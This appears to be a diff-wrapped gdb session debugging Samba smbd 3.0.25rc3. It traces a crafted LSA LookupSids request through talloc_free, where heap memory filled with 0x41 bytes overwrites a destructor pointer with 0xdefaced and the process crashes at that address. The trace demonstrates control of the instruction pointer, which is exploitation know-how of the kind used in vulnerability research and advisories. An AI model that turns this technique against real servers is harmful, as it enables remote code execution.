@@ -1,0 +1,86 @@
+(gdb) break api_lsa_lookup_sids
+Breakpoint 1 at 0x817ce83: file rpc_server/srv_lsa.c, line 162.
+(gdb) r -i -S -d
+Starting program: /opt/samba/sbin/smbd -i -S -d
+Failed to read a valid object file image from memory.
+[Thread debugging using libthread_db enabled]
+[New Thread -1213040976 (LWP 17466)]
+smbd version 3.0.25rc3 started.
+Copyright Andrew Tridgell and the Samba Team 1992-2007
+WARNING: The "printer admin" option is deprecated
+Unable to connect to CUPS server localhost:631 - Address family not supported by protocol
+Unable to connect to CUPS server localhost:631 - Address family not supported by protocol
+Breakpoint 1, api_lsa_lookup_sids (p=0x85257f0) at rpc_server/srv_lsa.c:162
+162             prs_struct *data = &p->in_data.data;
+(gdb) break _talloc_free
+Breakpoint 2 at 0x82adfbf: file lib/talloc/talloc.c, line 339.
+(gdb) c
+Continuing.
+prs_mem_get: reading data of size 2694881440 would overrun buffer by 2694879360 bytes.
+api_lsa_lookup_sids: failed to unmarshall LSA_Q_LOOKUP_SIDS.
+api_rpcTNP: lsarpc: LSA_LOOKUPSIDS failed.
+
+Breakpoint 2, _talloc_free (ptr=0x852bb18) at lib/talloc/talloc.c:339
+339             if (unlikely(ptr == NULL)) {
+(gdb) n
+343             tc = talloc_chunk_from_ptr(ptr);
+(gdb) n
+345             if (unlikely(tc->refs)) {
+(gdb) n
+362             if (unlikely(tc->flags & TALLOC_FLAG_LOOP)) {
+(gdb) n
+367             if (unlikely(tc->destructor)) {
+(gdb) n
+368                     talloc_destructor_t d = tc->destructor;
+(gdb) n
+369                     if (d == (talloc_destructor_t)-1) {
+(gdb) n
+372                     tc->destructor = (talloc_destructor_t)-1;
+(gdb) n
+373                     if (d(ptr) == -1) {
+(gdb) p d
+$1 = (talloc_destructor_t) 0xdefaced
+(gdb) x/x tc - 20
+0x852b818:      0x41414141
+(gdb)
+0x852b81c:      0x41414141
+(gdb)
+0x852b820:      0x00004141
+(gdb)
+0x852b824:      0x41414141
+(gdb)
+0x852b828:      0x41414141
+(gdb)
+0x852b82c:      0x41414141
+(gdb)
+0x852b830:      0x00004141
+(gdb)
+0x852b834:      0x41414141
+(gdb)
+0x852b838:      0x41414141
+(gdb)
+0x852b83c:      0x41414141
+(gdb)
+0x852b840:      0x00004141
+(gdb)
+0x852b844:      0x41414141
+(gdb)
+0x852b848:      0x41414141
+(gdb)
+0x852b84c:      0x41414141
+(gdb)
+0x852b850:      0x00004141
+(gdb)
+0x852b854:      0x41414141
+(gdb)
+0x852b858:      0x41414141
+(gdb)
+0x852b85c:      0x41414141
+(gdb)                                   
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0defaced in ?? ()
+(gdb)
+
